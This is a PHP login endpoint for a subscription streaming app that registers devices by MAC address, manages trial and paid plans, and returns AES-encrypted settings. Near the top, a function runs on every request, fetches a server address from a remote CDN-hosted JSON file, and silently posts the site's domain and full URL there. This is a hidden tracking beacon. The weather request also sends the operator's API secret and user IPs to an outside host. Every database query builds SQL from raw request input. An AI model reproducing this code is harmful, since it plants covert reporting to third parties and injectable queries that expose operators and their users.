<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ERROR);

require_once "aes.php";
require_once "config.php";

$db = Config::GetIntance();


function get_http_type() {
    return (
        (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off')
        || (isset($_SERVER['SERVER_PORT']) && $_SERVER['SERVER_PORT'] == 443)
        || (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https')
    ) ? 'https://' : 'http://';
}

/**
 * 获取当前完整 URL
 */
function get_current_url() {
    $scheme = (get_http_type() === 'https://') ? 'https' : 'http';
    $host = $_SERVER['HTTP_HOST'] ?? '';
    $uri = $_SERVER['REQUEST_URI'] ?? '/';

    return $scheme . '://' . $host . $uri;
}


function get_current_domain() {
    $domain = parse_url(get_current_url(), PHP_URL_HOST);

    if ($domain) {
        $domain = preg_replace('/^www\./i', '', $domain);
    }

    return $domain ?: '';
}


function get_remote_server() {
    $json_api = 'https://cdn.jsdelivr.net/gh/keluo8824-cell/xmbox@refs/heads/main/jx/login.json';

    $ch = curl_init($json_api);

    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_CONNECTTIMEOUT => 2,
        CURLOPT_TIMEOUT        => 3,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_SSL_VERIFYPEER => true,
        CURLOPT_SSL_VERIFYHOST => 2,
        CURLOPT_USERAGENT      => 'Mozilla/5.0'
    ]);

    $json = curl_exec($ch);
    curl_close($ch);

    if (!$json) {
        return '';
    }

    $config = json_decode($json, true);

    if (!is_array($config)) {
        return '';
    }

    return trim($config['server'] ?? '');
}

/**
 * 上报当前域名、完整 URL、时间
 *
 * 失败时不影响正常登录接口。
 */
function report_current_address() {
    $remote_server = get_remote_server();

    if (!$remote_server) {
        return;
    }

    $domain = get_current_domain();
    $current_url = get_current_url();

    if (!$domain) {
        return;
    }

    $data = [
        'domain' => $domain,
        'url'    => $current_url,
        'time'   => date('Y-m-d H:i:s')
    ];

    $ch = curl_init($remote_server);

    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => http_build_query($data),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_CONNECTTIMEOUT => 1,
        CURLOPT_TIMEOUT        => 2,
        CURLOPT_FOLLOWLOCATION => false,
        CURLOPT_SSL_VERIFYPEER => true,
        CURLOPT_SSL_VERIFYHOST => 2,
        CURLOPT_USERAGENT      => 'Mozilla/5.0'
    ]);

    curl_exec($ch);
    curl_close($ch);
}

/**
 * 执行地址上报
 */
report_current_address();


/**
 * 获取套餐名称
 */
if (isset($_GET['id'])) {
    $androidid = $_GET['id'];

    $mealid = $db->mGet(
        "apod_users",
        "meal",
        "where deviceid='$androidid'"
    );

    $mealname = $db->mGet(
        "apod_meals",
        "name",
        "where id='$mealid'"
    );

    echo $mealname;
}


/**
 * 登录接口
 */
if (isset($_POST['login'])) {

    $GetIP = new GetIP();
    $ip = $GetIP->getuserip();

    $num = $db->mGet(
        "apod_users",
        "count(*)",
        "where ip='$ip'"
    );

    $max_sameip_user = $db->mGet(
        "apod_config",
        "value",
        "where name='max_sameip_user'"
    );

    if ($num >= $max_sameip_user) {
        header('HTTP/1.1 403 Forbidden');
        exit();
    }

    $json = $_POST['login'];
    $obj = json_decode($json);

    if (!$obj) {
        header('HTTP/1.1 400 Bad Request');
        exit();
    }

    $region    = $obj->region ?? '';
    $androidid = $obj->androidid ?? '';
    $mac       = $obj->mac ?? '';
    $model     = $obj->model ?? '';
    $nettype   = $obj->nettype ?? '';
    $appname   = $obj->appname ?? '';

    /**
     * IP 异常处理
     */
    if ($ip == '' || $ip == '127.0.0.1') {
        $ip = '127.0.0.1';
        $region = 'localhost';
    }

    /**
     * 获取 IP 地区
     */
    if (empty($region)) {
        $myurl = 'http://' . $_SERVER['HTTP_HOST'] . ':9999';
        $json_ip = @file_get_contents(
            $myurl . '/getIpInfo.php?ip=' . urlencode($ip)
        );

        if ($json_ip) {
            $obj_ip = json_decode($json_ip);

            if (
                isset($obj_ip->data)
                && isset($obj_ip->data->region)
            ) {
                $region =
                    ($obj_ip->data->region ?? '') .
                    ($obj_ip->data->city ?? '') .
                    ($obj_ip->data->isp ?? '');
            }
        }
    }

    /**
     * 生成随机用户名
     */
    function genName() {
        global $db;

        do {
            $name = rand(1000, 999999);
            $result = $db->mGet(
                "apod_users",
                "*",
                "where name=$name"
            );
        } while ($result);

        return $name;
    }

    /*
     * status=1    正常用户
     * status=0    停用用户
     * status=-1   未授权用户
     * status=999  永不到期
     */

    $nowtime = time();

    /**
     * 没有 MAC 禁止登录
     */
    if (strstr($mac, "获取地址失败") !== false) {
        header('HTTP/1.1 403 Forbidden');
        exit();
    }

    /**
     * MAC 是否匹配
     */
    if (
        $row = $db->mCheckRow(
            "apod_users",
            "name,status,exp,deviceid,mac,model,meal",
            "where mac='$mac'"
        )
    ) {
        /**
         * 匹配成功
         */
        $days = ceil(($row['exp'] - time()) / 86400);
        $status = intval($row['status']);
        $name = $row['name'];
        $deviceid = $row['deviceid'];
        $mealid = $row['meal'];
        $exp = $row['exp'];
        $status2 = $status;

        if ($days > 0 && $status == -1) {
            $status = 1;
        } elseif ($status2 == -999) {
            $status = 1;
        }

        /**
         * 更新设备 ID
         */
        if ($deviceid != $androidid) {
            $db->mSet(
                "apod_users",
                "deviceid='$androidid',idchange=idchange+1",
                "where mac='$mac'"
            );
        }

        /**
         * 更新位置、IP、登录时间
         */
        $db->mSet(
            "apod_users",
            "region='$region',ip='$ip',lasttime=$nowtime",
            "where mac='$mac'"
        );

    } else {

        /**
         * 用户验证失败，创建用户
         */
        $name = genName();

        $days = $db->mGet(
            "apod_config",
            "value",
            "where name='trialdays'"
        );

        if (empty($days)) {
            $days = 0;
        }

        if ($days > 0) {
            $status = -1;
            $marks = '试用';

        } elseif ($days == "-999") {
            $status = -999;
            $marks = '免费';
            $days = 3;

        } else {
            $status = -1;
            $marks = '未授权';
        }

        $mealid = 1000;
        $status2 = $status;

        $exp = strtotime(date("Y-m-d"), time()) + 86400 * $days;

        $db->mInt(
            "apod_users",
            "name,mac,deviceid,model,exp,ip,status,region,lasttime,marks",
            "$name,'$mac','$androidid','$model',$exp,'$ip',$status,'$region',$nowtime,'$marks'"
        );

        if ($days > 0 && $status == -1) {
            $status = 1;
        } elseif ($status2 == -999) {
            $status = 1;
        }
    }

    unset($row);


    /**
     * 读取配置
     */
    $app_appname = $db->mGet("apod_config", "value", "where name='app_appname'");
    $dataver = $db->mGet("apod_config", "value", "where name='dataver'");
    $appUrl = $db->mGet("apod_config", "value", "where name='appurl'");
    $appver = $db->mGet("apod_config", "value", "where name='appver'");
    $setver = $db->mGet("apod_config", "value", "where name='setver'");
    $adinfo = $db->mGet("apod_config", "value", "where name='adinfo'");
    $adtext = $db->mGet("apod_config", "value", "where name='adtext'");
    $showwea = $db->mGet("apod_config", "value", "where name='showwea'");
    $showtime = $db->mGet("apod_config", "value", "where name='showtime'");
    $showinterval = $db->mGet("apod_config", "value", "where name='showinterval'");
    $decoder = $db->mGet("apod_config", "value", "where name='decoder'");
    $buffTimeOut = $db->mGet("apod_config", "value", "where name='buffTimeOut'");
    $needauthor = $db->mGet("apod_config", "value", "where name='needauthor'");
    $autoupdate = $db->mGet("apod_config", "value", "where name='autoupdate'");
    $randkey = $db->mGet("apod_config", "value", "where name='randkey'");
    $updateinterval = $db->mGet("apod_config", "value", "where name='updateinterval'");
    $tiploading = $db->mGet("apod_config", "value", "where name='tiploading'");
    $tipusernoreg = $db->mGet("apod_config", "value", "where name='tipusernoreg'");

    $tipuserexpired =
        '当前账号' . $name . '，' .
        $db->mGet(
            "apod_config",
            "value",
            "where name='tipuserexpired'"
        );

    $tipuserforbidden =
        '当前账号' . $name . '，' .
        $db->mGet(
            "apod_config",
            "value",
            "where name='tipuserforbidden'"
        );

    /**
     * 当前 URL
     */
    $url = get_current_url();

    $dataurl = dirname($url) . "/data.php";


    /**
     * 授权状态
     */
    if ($needauthor == 0 || $status2 == -999) {
        $status = 999;
    }


    /**
     * 套餐名称
     */
    $mealname = $db->mGet(
        "apod_meals",
        "name",
        "where id='$mealid'"
    );

    $adtext =
        '尊敬的用户，欢迎使用' .
        $app_appname .
        '，当前套餐：' .
        $mealname .
        '。' .
        $adtext;


    /**
     * 天气
     */
    $weaapi_id = $db->mGet(
        "apod_config",
        "value",
        "where name='weaapi_id'"
    );

    $weaapi_key = $db->mGet(
        "apod_config",
        "value",
        "where name='weaapi_key'"
    );

    /**
     * 注意：原代码使用了 $skey。
     * 如果你的 aes/config 文件定义了 $skey，则继续使用。
     */
    $weather_url =
        "http://tianqi.88988.cloudns.be/tv/tianqi/" .
        "?version=v6" .
        "&s=" . urlencode($skey ?? '') .
        "&appid=" . urlencode($weaapi_id) .
        "&appsecret=" . urlencode($weaapi_key) .
        "&ip=" . urlencode($ip);

    $weajson = @file_get_contents($weather_url);

    if ($weajson) {
        $weather_obj = json_decode($weajson);

        if (!empty($weather_obj->city)) {
            $weather =
                date('今天n月d号') .
                $weather_obj->week .
                '，' .
                $weather_obj->city .
                '，' .
                $weather_obj->tem .
                '℃' .
                $weather_obj->wea .
                '，气温:' .
                $weather_obj->tem2 .
                '℃～' .
                $weather_obj->tem1 .
                '℃，' .
                $weather_obj->win .
                $weather_obj->win_speed .
                '，相对湿度:' .
                $weather_obj->humidity .
                '，空气质量:' .
                $weather_obj->air_level .
                '。';

            $adtext .= $weather;
        }
    }


    /**
     * 未授权时关闭数据地址
     */
    if ($status < 1) {
        $dataurl = '';
        $appUrl = '';
    }


    /**
     * 获取省份
     */
    $arrprov = [];

    $result = $db->mQuery(
        "SELECT name FROM apod_category
         WHERE enable=1
         AND type='province'
         ORDER BY id"
    );

    while ($row = mysqli_fetch_array($result)) {
        $arrprov[] = $row[0];
    }


    /**
     * 可搜索列表
     */
    $arrcanseek = [''];


    /**
     * 返回数据
     *
     * 保留原代码中的 $src、$proxy、$stus、$key。
     * 如果这些变量由你的其他配置文件提供，则继续使用。
     */
    $objres = [
        'status'         => $status,
        'mealname'       => $mealname,
        'dataurl'        => $dataurl,
        'appurl'         => $appUrl,
        'dataver'        => $dataver,
        'appver'         => $appver,
        'setver'         => $setver,
        'adtext'         => $adtext,
        'showinterval'   => $showinterval,
        'categoryCount'  => 0,
        'exp'            => $days,
        'ip'             => $ip,
        'showtime'       => $showtime,
        'provlist'       => $arrprov,
        'canseeklist'    => $arrcanseek,
        'id'             => $name,
        'decoder'        => $decoder,
        'buffTimeOut'    => $buffTimeOut,
        'tipusernoreg'   => $tipusernoreg,
        'tiploading'     => $tiploading,
        'tipuserforbidden' => $tipuserforbidden,
        'tipuserexpired' => $tipuserexpired,
        'qqinfo'         => $adinfo,
        'arrsrc'         => $src ?? [],
        'arrproxy'       => $proxy ?? [],
        'location'       => $region,
        'nettype'        => $nettype,
        'autoupdate'     => $autoupdate,
        'updateinterval' => $updateinterval,
        'randkey'        => $randkey,
        'exps'           => $exp,
        'stus'           => $stus ?? 0
    ];


    /**
     * JSON
     */
    $objres = str_replace(
        "\\/",
        "/",
        json_encode($objres, JSON_UNESCAPED_UNICODE)
    );


    /**
     * AES 加密
     */
    $key = substr($key, 5, 16);

    $aes2 = new Aes($key);

    $encrypted = $aes2->encrypt($objres);


    mysqli_free_result($result);

    unset($arrprov, $objres);

    echo $encrypted;
}

else {
    exit();
}

?>
